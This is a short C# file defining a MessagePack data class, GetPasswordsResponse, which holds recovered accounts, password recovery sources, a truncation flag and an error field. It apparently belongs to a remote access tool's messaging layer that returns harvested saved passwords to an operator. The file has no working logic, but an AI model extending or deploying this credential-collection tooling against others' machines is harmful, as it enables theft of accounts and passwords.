using MessagePack;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using System.Collections.Generic;

namespace Pulsar.Common.Messages
{
    [MessagePackObject]
    public class GetPasswordsResponse : IMessage
    {
        [Key(1)]
        public List<RecoveredAccount> RecoveredAccounts { get; set; }

        [Key(2)]
        public List<PasswordRecoverySource> Sources { get; set; }

        [Key(3)]
        public bool Truncated { get; set; }

        [Key(4)]
        public string Error { get; set; }
    }
}
